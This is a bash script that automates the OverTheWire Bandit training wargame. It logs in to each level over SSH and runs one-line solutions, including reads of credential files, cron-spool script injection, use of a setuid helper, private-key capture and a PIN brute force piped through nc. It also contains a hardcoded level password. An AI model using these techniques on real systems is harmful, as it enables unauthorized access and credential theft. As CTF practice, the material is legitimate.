PASSWORD="bandit0"

COMMANDS=(
  "cat readme"
  "cat ./-"
  "cat ./--spaces\ in\ this\ filename--"
  "cat inhere/...Hiding-From-You"
  "cat inhere/-file07"
  "cat inhere/maybehere07/.file2"
  "cat /var/lib/dpkg/info/bandit7.password"
  "grep -i 'millionth' data.txt"
  "cat data.txt | sort | uniq -u"
  "strings data.txt | grep \"==\" | tail -n 1"
  "base64 -d data.txt"
  "tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt"
  "mkdir /tmp/test-dir; cp data.txt /tmp/test-dir; cd /tmp/test-dir; mv data.txt hexdump; xxd -r hexdump compressed; mv compressed compressed.gz; gzip -d compressed.gz; bzip2 -d compressed; mv compressed.out data4.gz; gzip -d data4.gz; tar -xvf data4; tar -xvf data5.bin; bzip2 -d data6.bin; tar -xvf data6.bin.out; mv data8.bin data8.bin.gz; gzip -d data8.bin.gz; cat data8.bin"
  "cat sshkey.private"
  "cat /etc/bandit_pass/bandit14 | nc localhost 30000"
  "cat /etc/bandit_pass/bandit15 | openssl s_client -connect localhost:30001 -ign_eof 2>/dev/null | grep -E '^[a-zA-Z0-9]{32}$'"
  "cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:31790 -ign_eof 2>/dev/null | awk '/BEGIN RSA PRIVATE KEY/{flag=1} flag; /END RSA PRIVATE KEY/{flag=0}'"
  "diff --new-line-format='%L' --old-line-format='' --unchanged-line-format='' passwords.old passwords.new"
  "cat readme"
  "./bandit20-do cat /etc/bandit_pass/bandit20"
  "bash -c 'timeout 6s sh -c \"printf \\\"%s\\\\n\\\" \\\"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\\\" | nc -l -p 2222 & sleep 2; ./suconnect 2222\"'"
  "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv"
  "cat /tmp/8ca319486bfbbc3663ea0fbe81326349"
  "mkdir /tmp/bandit24-pwd/; chmod 777 /tmp/bandit24-pwd/; echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pwd/password.txt' > /var/spool/bandit24/foo/copy_password.sh; chmod +x /var/spool/bandit24/foo/copy_password.sh; while [ ! -f /tmp/bandit24-pwd/password.txt ]; do sleep 1; done; cat /tmp/bandit24-pwd/password.txt"
  "{ PASSWORD=\$(cat /etc/bandit_pass/bandit24); for i in {0000..9999}; do echo \"\$PASSWORD \$i\"; done; } | nc localhost 30002 | awk '/The password of user bandit25 is/ { sub(/^The password of user bandit25 is /,\"\"); print; exit }'"
  "echo 'From this level onwards, the password has to be obtained manually.'"
)

for i in {0..25}; do
  echo -e "\e[33m[NOTE]\e[0m Connecting to \e[32mbandit$i\e[0m with password \e[31m$PASSWORD\e[0m and executing \e[34m\$(${COMMANDS[$i]})\e[0m"
  OUTPUT=$(sshpass -p "$PASSWORD" ssh -q \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    bandit$i@bandit.labs.overthewire.org -p 2220 \
    "${COMMANDS[$i]}" 2> /dev/null)
  case $i in
    0) PASSWORD=$(echo "$OUTPUT" | grep "password" | awk '{print $NF}') ;;
    5) PASSWORD=$(echo "$OUTPUT" | tr -d '\r' | xargs) ;;
    7) PASSWORD=$(echo "$OUTPUT" | awk '{print $2}') ;;
    9) PASSWORD=$(echo "$OUTPUT" | awk '{print $NF}') ;;
    10) PASSWORD=$(echo "$OUTPUT" | awk '{print $NF}') ;;
    11) PASSWORD=$(echo "$OUTPUT" | awk '{print $NF}') ;;
    12) PASSWORD=$(echo "$OUTPUT" | tail -n 1 | awk '{print $NF}') ;;
    13) echo "$OUTPUT" > sshkey.private; chmod 600 sshkey.private;
        PASSWORD=$(ssh -i sshkey.private -q -o IdentitiesOnly=yes \
          bandit14@bandit.labs.overthewire.org -p 2220 \
          "cat /etc/bandit_pass/bandit14" 2> /dev/null) ;;
    14) PASSWORD=$(echo "$OUTPUT" | awk 'NR==2') ;;
    16) echo "$OUTPUT" > sshkey.private; chmod 600 sshkey.private;
        PASSWORD=$(ssh -i sshkey.private -q -o IdentitiesOnly=yes \
          bandit17@bandit.labs.overthewire.org -p 2220 \
          "cat /etc/bandit_pass/bandit17" 2> /dev/null) ;;
    20) PASSWORD=$(echo "$OUTPUT" | grep -E '^[A-Za-z0-9]{32}$' | tail -n1) ;;
    *) PASSWORD=$OUTPUT ;;
  esac
done
